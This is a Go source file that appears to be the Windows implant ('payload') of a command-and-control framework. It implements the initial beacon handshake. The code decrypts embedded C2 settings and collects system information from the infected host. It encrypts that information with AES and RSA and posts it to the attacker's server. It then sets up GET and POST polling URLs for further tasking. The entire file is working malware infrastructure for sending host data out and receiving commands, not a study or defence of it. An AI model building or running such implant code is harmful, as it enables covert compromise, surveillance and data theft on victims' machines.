// server/docker/payloads/Windows/handshake.go

//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
)

type HandshakeManager struct {
	decryptedValues map[string]string
	currentClientID string
	initialClientID string // Store the very first client ID
	getURL          string
	postURL         string
	secureComms     *SecureComms
}

func NewHandshakeManager() (*HandshakeManager, error) {
	decrypted := decryptAllValues()
	return &HandshakeManager{
		decryptedValues: decrypted,
		initialClientID: clientID, // Store the initial client ID
	}, nil
}

func (hm *HandshakeManager) PerformHandshake() error {
	// Step 1: Collect fresh system info with new seed
	sysInfoReport, err := CollectSystemInfo(hm.initialClientID) // Use initial client ID
	if err != nil {
		return fmt.Errorf("failed to collect system information: %v", err)
	}

	// Step 2: Convert to JSON
	jsonOutput, err := sysInfoReport.ToJSON()
	if err != nil {
		return fmt.Errorf("failed to convert to JSON: %v", err)
	}

	// Step 3: Double encrypt the JSON (AES + RSA)
	encryptedJSON, err := EncryptInitialHandshake(
		jsonOutput,
		hm.decryptedValues["Secret"],
		hm.decryptedValues["Public Key"],
	)
	if err != nil {
		return fmt.Errorf("failed to encrypt handshake data: %v", err)
	}

	// Step 4: Build POST URL with initial clientID
	baseURL := buildBaseURL(
		hm.decryptedValues["Protocol"],
		hm.decryptedValues["IP"],
		hm.decryptedValues["Port"],
	)
	postURL := buildPostURL(
		baseURL,
		hm.decryptedValues["POST Route"],
		hm.decryptedValues["POST Client ID Name"],
		hm.initialClientID, // Use initial client ID for the handshake
	)

	// Step 5: Send handshake and get new client ID
	newClientID, err := sendInitialPost(postURL, encryptedJSON, hm.decryptedValues)
	if err != nil {
		return fmt.Errorf("failed to send handshake: %v", err)
	}

	log.Printf("Handshake successful - New Client ID: %s", newClientID)

	// Step 6: Store old client ID in case we need to revert
	oldClientID := hm.currentClientID

	// Step 7: Update current client ID (but keep initial ID the same)
	hm.currentClientID = newClientID
	clientID = newClientID // Update global clientID

	// Step 8: Build new URLs with new client ID for subsequent communications
	hm.getURL = buildGetURL(
		baseURL,
		hm.decryptedValues["GET Route"],
		hm.decryptedValues["GET Client ID Name"],
		newClientID,
	)
	hm.postURL = buildPostURL(
		baseURL,
		hm.decryptedValues["POST Route"],
		hm.decryptedValues["POST Client ID Name"],
		newClientID,
	)

	log.Printf("Updated URLs with new client ID:")
	log.Printf("Initial Client ID: %s", hm.initialClientID)
	log.Printf("Previous Client ID: %s", oldClientID)
	log.Printf("New Client ID: %s", newClientID)
	log.Printf("New GET URL: %s", hm.getURL)
	log.Printf("New POST URL: %s", hm.postURL)

	// Step 9: Initialize SecureComms with initial secret and new seed
	hm.secureComms = NewSecureComms(
		hm.decryptedValues["Secret"],
		sysInfoReport.AgentInfo.Seed,
	)

	// Step 10: Initialize polling config with new parameters
	// NOTE: We don't start polling here anymore - let the caller handle it

	// REMOVED Step 11 - Don't start polling in the handshake function
	// The caller (main.go or refreshHandshake) will start polling

	return nil
}

func (hm *HandshakeManager) RefreshHandshake() error {
	log.Println("Starting refresh handshake...")
	oldClientID := hm.currentClientID

	err := hm.PerformHandshake()
	if err != nil {
		// On error, ensure we restore old client ID
		hm.currentClientID = oldClientID
		clientID = oldClientID
		return fmt.Errorf("refresh handshake failed: %v", err)
	}

	return nil
}

func (hm *HandshakeManager) GetCurrentClientID() string {
	return hm.currentClientID
}

func (hm *HandshakeManager) GetCurrentURLs() (string, string) {
	return hm.getURL, hm.postURL
}

func (hm *HandshakeManager) SetClientID(clientID string) {
	hm.currentClientID = clientID
}

func (hm *HandshakeManager) GetSecureComms() *SecureComms {
	return hm.secureComms
}
